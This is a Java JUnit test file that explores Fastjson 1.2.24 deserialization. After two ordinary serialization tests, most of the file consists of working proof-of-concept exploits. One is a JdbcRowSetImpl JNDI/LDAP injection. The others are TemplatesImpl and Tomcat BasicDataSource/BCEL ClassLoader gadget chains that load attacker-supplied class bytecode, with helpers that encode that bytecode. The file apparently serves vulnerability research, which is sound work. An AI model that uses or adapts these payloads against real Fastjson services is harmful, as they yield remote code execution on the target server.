package me.mole;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import me.mole.pojo.Student;
import org.apache.commons.io.IOUtils;
import org.apache.tomcat.util.codec.binary.Base64;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.HashMap;

public class Fastjson1224ApplicationTest {

    @Test
    public void test1() {
        Student student = new Student();
        student.setName("lAdyb1rd");
        student.setAge(6);
        HashMap<String,String> map = new HashMap<String,String>();
        map.put("k1", "val1");
        student.setProperties(map);
//
        System.out.println("----------序列化------------");
        //SerializerFeature.WriteClassName，是JSON.toJSONString()中的一个设置属性值，
        // 设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名
        String jsonstring = JSON.toJSONString(student, SerializerFeature.WriteClassName);
        System.out.println(jsonstring);

        String jsonStr = "{\"@type\":\"me.mole.pojo.Student\",\"age\":6,\"name\":\"lAdyb1rd\",\"_properties\":{\"k1\":\"val1\"}}";
//        String jsonStr = "{\"@type\":\"me.mole.pojo.Student\",\"age\":6,\"name\":\"lAdyb1rd\",\"properties\":{\"@type\":\"java.util.HashMap\",\"k1\":\"val1\"}}";
        System.out.println("jsonStr=" + jsonStr);
//        System.out.println("----------反序列化: JSON.parseObject,带类型class------------");
        //Feature.SupportNonPublicField：当属性为私有，且没有对应的public setter方法时，可以反序列化私有属性。
//        Student stu1 = JSON.parseObject(jsonStr, Student.class, Feature.SupportNonPublicField);
//        Student stu1 = (Student) JSON.parseObject(jsonStr, Object.class, Feature.SupportNonPublicField);
//        System.out.println(stu1);
        System.out.println("----------反序列化: JSON.parseObject，不带类型class------------");
        JSONObject jsonObject = JSON.parseObject(jsonStr);
        System.out.println(jsonObject.toString());
//        System.out.println("----------反序列化: JSON.parse------------");
//        Student stu2 = (Student) JSON.parse(jsonStr);
//        System.out.println(stu2);
    }

    @Test
    public void test2() {
        String jsonStr = "{\"@type\":\"me.mole.pojo.Student\",\"age\":6,\"name\":\"lAdyb1rd\",\"_properties\":{\"k1\":\"val1\"}}";
//        String jsonStr = "{\"@type\":\"me.mole.pojo.Student\",\"age\":6,\"name\":\"lAdyb1rd\",\"properties\":{\"@type\":\"java.util.HashMap\",\"k1\":\"val1\"}}";
        System.out.println("jsonStr=" + jsonStr);
//        System.out.println("----------反序列化: JSON.parseObject,带类型class------------");
        //Feature.SupportNonPublicField：当属性为私有，且没有对应的public setter方法时，可以反序列化私有属性。
//        Student stu1 = JSON.parseObject(jsonStr, Student.class, Feature.SupportNonPublicField);
//        Student stu1 = (Student) JSON.parseObject(jsonStr, Object.class, Feature.SupportNonPublicField);
//        System.out.println(stu1);
        System.out.println("----------反序列化: JSON.parseObject，不带类型class------------");
        JSONObject jsonObject = JSON.parseObject(jsonStr);
        System.out.println(jsonObject.toString());
//        System.out.println("----------反序列化: JSON.parse------------");
//        Student stu2 = (Student) JSON.parse(jsonStr);
//        System.out.println(stu2);
    }

    /*
    {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "ldap://127.0.0.1:8085/Exploit",
      "autoCommit": true
    }
     */
    @Test
    public void test_poc_1() {
        String fj_poc = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8085/abc\",\"autoCommit\":true}";
        System.out.println(fj_poc);
        JSON.parseObject(fj_poc);
    }

    /*
      {
          "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
          "_bytecodes": ["...<clazz-byte-codes-base64>..."],
          "_name": "a.b",
          "_tfactory": {},
          "_outputProperties": {}
      }
     */
    @Test
    public void test_poc_2() {
        String evilClassPath = "/Users/fa1c0n/codeprojects/IdeaProjects/misc-classes/target/classes/Exploit2.class";
        String evilClazzB64 = readClass(evilClassPath);
        String fj_poc = "{\n" +
                "    \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
                "    \"_bytecodes\": [\"" + evilClazzB64 + "\"],\n" +
                "    \"_name\": \"a.b\",\n" +
                "    \"_tfactory\": {},\n" +
                "    \"_outputProperties\": {}\n" +
                "}";
        System.out.println(fj_poc);
        JSONObject jsonObject = JSON.parseObject(fj_poc, Feature.SupportNonPublicField);
    }

    /*
     {
       {
        "@type": "com.alibaba.fastjson.JSONObject",
        "a": {
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},
                "driverClassName": "$$BCEL....<BCEL-code>..."
             }
       }: "b"
     }
     */
    @Test
    public void test_poc_3_1() {
        String evilClassPath = "/Users/fa1c0n/codeprojects/IdeaProjects/misc-classes/target/classes/Exploit3.class";
        String bcelCode = readClassToBCEL(evilClassPath);
        String fj_poc = "{\n" +
                "  {\n" +
                "   \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                "   \"a\": {\n" +
                "           \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "           \"driverClassLoader\": {\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\n" +
                "           \"driverClassName\": \""+ bcelCode +"\"\n" +
                "        }\n" +
                "  }: \"b\"\n" +
                "} ";

        System.out.println(fj_poc);
        JSON.parseObject(fj_poc);
    }

    /*
     该exp适用于JSON.parseObject(), 不适用于JSON.parse();
      {
       "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
         "driverClassLoader": {
           "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
         },
         "connection":"{}",
         "driverClassName": "$$BCEL....<BCEL-code>..."
      }
     */
    @Test
    public void test_poc_3_2() {
        String evilClassPath = "/Users/fa1c0n/codeprojects/IdeaProjects/misc-classes/target/classes/Exploit3.class";
        String bcelCode = readClassToBCEL(evilClassPath);
        String fj_poc = "{\n" +
                " \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "   \"driverClassLoader\": {\n" +
                "     \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "   },\n" +
                "   \"connection\":\"{}\",\n" +
                "   \"driverClassName\": \"" + bcelCode + "\"\n" +
                "}";
        System.out.println(fj_poc);
        JSONObject jsonObject = JSON.parseObject(fj_poc);
    }

    private String readClass(String clazzPath){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(clazzPath)), bos);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return Base64.encodeBase64String(bos.toByteArray());
    }

    private String readClassToBCEL(String clazzPath) {
        String bcelCode = "$$BCEL$$";
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            IOUtils.copy(new FileInputStream(new File(clazzPath)), bos);
            bcelCode += Utility.encode(bos.toByteArray(), true);
            return bcelCode;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }
}